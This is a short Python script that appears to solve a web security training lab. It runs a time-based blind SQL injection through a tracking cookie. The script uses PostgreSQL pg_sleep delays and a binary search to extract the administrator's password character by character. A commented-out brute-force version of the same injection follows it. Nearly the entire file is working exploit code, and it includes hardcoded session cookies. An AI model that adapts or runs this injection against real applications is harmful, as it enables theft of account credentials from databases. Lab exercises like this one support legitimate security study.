#!/usr/bin/python3

import requests

passwd = ''
URL = 'https://0a24005903de7a3f817f1c6600b900f9.web-security-academy.net/'
chars = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz' 

for i in range(1,21):
	low = 0
	high = len(chars) - 1
	print("Vị trí: ", i)
	while low < high:
		mid = low + int((high - low)/2)
		INJECT = "wTbfbka3OZFvT1Wz' || (SELECT CASE WHEN (SUBSTRING(password,{index},1) > '{character}') THEN pg_sleep(10) ELSE '' END FROM users WHERE username='administrator')-- a".format(index=i, character=chars[mid])
		cookie = {'session':'wvjLxLPX7JyuRWn79E3vUVyWLadnFbyt', 'TrackingId':INJECT}
		r = requests.get(URL, cookies=cookie)
		print("Khoảng ", chars[low], "-", chars[high], "____" ,chars[mid]," TIME: ", r.elapsed)
		if int(r.elapsed.total_seconds()) >= 10:
			if high - mid == 1 or high - low == 2:
				passwd += chars[high]
				break
			low = mid + 1
	
		else:
			INJECT = "wTbfbka3OZFvT1Wz' || (SELECT CASE WHEN (SUBSTRING(password,{index},1) = '{character}') THEN pg_sleep(10) ELSE '' END FROM users WHERE username='administrator')-- a".format(index=i, character=chars[mid])
			cookie = {'session':'wvjLxLPX7JyuRWn79E3vUVyWLadnFbyt', 'TrackingId':INJECT}
			r = requests.get(URL, cookies=cookie)
			print("Khoảng ", chars[low], "-", chars[high], "____" ,chars[mid]," TIME: ", r.elapsed)
			if int(r.elapsed.total_seconds()) >= 10:
				passwd += chars[mid]
				break
			if high - mid == 1 :
				passwd += chars[low]
				break
			high = mid - 1


	print("PASS: ", passwd)

# INJECT = "wTbfbka3OZFvT1Wz' || (SELECT CASE WHEN (SUBSTRING(password,{a},1) = '{b}') THEN pg_sleep(10) ELSE '' END FROM users WHERE username='administrator')-- a".format(a=1, b='2')
# cookie = {'session':'wvjLxLPX7JyuRWn79E3vUVyWLadnFbyt', 'TrackingId':INJECT}
# r = requests.get(URL, cookies=cookie)
# print(r.elapsed)

# for i in range(1,21):
# 	for c in chars:
# 		INJECT = "y0NpgAUJr7MD2UuR'|| (SELECT CASE WHEN (SUBSTRING(password,{index},1) = '{character}') THEN pg_sleep(10) ELSE '' END FROM users WHERE username='administrator')-- a".format(index=i, character=str(c))
# 		cookie = {'session':'uZyjug4L7hpD01PFowo4VSeqTkhepdU0', 'TrackingId':INJECT}
# 		r = requests.get(URL, cookies=cookie)
# 		print("Vị trí: ", i, "____" ,c," TIME: ", r.elapsed)
# 		if int(r.elapsed.total_seconds()) >= 10:
# 				passwd += c
# 				break
# 	print("PASS: ", passwd)
